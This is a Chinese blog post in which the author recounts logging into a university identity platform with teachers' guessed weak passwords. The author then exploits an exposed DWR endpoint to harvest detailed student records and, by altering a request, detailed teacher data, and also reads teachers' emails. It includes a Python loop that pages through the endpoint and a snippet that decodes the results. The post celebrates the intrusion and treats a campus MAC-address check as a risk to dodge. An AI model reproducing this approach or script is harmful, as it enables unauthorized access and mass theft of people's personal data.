---
layout: post
title: Crawl From Little II
categories: 学习数据挖掘的路上
tags: 
- 学习笔记
- 抓取数据
---
#### 接上回那个勉强算得上或算不上抓取的回忆，但是那些数据之中有一些很敏感的信息，包括教师的详细信息，利用这个信息登陆统一身份验证平台，想必又会有收货呢

### 登陆统一身份验证平台
在登陆的过程中，发现女老师对密码安全基本是没什么意识的，虽然你们也是计算机学院的，但是你们真的好意思说你们是计算机学员的吗？
在登陆进去，发现老师可以查询学生的信息（仅包含姓名学号，班级），看了看挺失望的，毕竟这些信息没什么鸟用，但是当我看网页源码的时候，发现这个系统的开发人员很不负责，只是把之前写的文本框给遮盖了，但是还是靠那个传数据。于是抓包分析，发现是post request payload，response的结果却是student的详细信息(一应俱全，应有尽有),好呗
不得不说，很激动，抓呗。

```python
#-*-coding:utf-8-*-
import requests
import urllib2
import urllib
import encodings

url = ""
header={}
def xs(request_payload):
	request = urllib2.Request(url, headers=headers, data=urllib.urlencode(request_payload))
	response = urllib2.urlopen(request, timeout=5)
	content = response.read()
	print(content)

for i in range(1,70):
	m_request_payload = {
	'callCount':'1',
	'httpSessionId':'ssssssssssssssssssssssssss',
	'scriptSessionId':'sssssssssssssssssssssssss',
	'page':'/xxxxx/xxxxx/171',
	'c0-scriptName':'XSXXDwrAction',
	'c0-methodName':'getList',
	'c0-id':'165116513216516',
	'c0-param0':'number:'+ str(i),
	'c0-param1':'null:null',
	'c0-param2':'null:null',
	'c0-param3':'string:',
	'c0-param4':'number:15'
}
xs(m_request_payload)
	
```
当然这还没有解码，数据获取的类型是
![img5](/images//crawl/5.png)

```python
import  re
pattern = r'"(.*?)"'
with open('IDinfomation','r') as f:
    key = re.findall(pattern,f.read())
    for peopele in key:
    tt=peopele.decode('raw_unicode_escape').encode('utf-8')
```

最后稍微提取一下就能得到详细的信息了，全是你想要的，如果在内网中，还可以通过统一身份平台跳到教务系统，然后把这些人的图片爬下来，哈哈，想想都有点激动呢。

然后晚上的时候，登一个账号发现里面的通讯录的response也是很奇怪，把老师的详细信息都response了，稍微改下post,于是所有的老师更加详细的信息到手。而且没事还挑了几个老师的学校邮箱看了看，不过并没有什么有用的。
本来想做个统计，绘个图表，结果发现统一信息门户里面都已经给了可视化的图，虽然很丑。不过我现在数据并未完全组织好，也没插入到数据库，电脑估计是要重装了。之前折腾的有问题了。

最后，老师来查mac地址，希望没事吧。虽然这个没有什么技术含量，但是还是很有动力的。



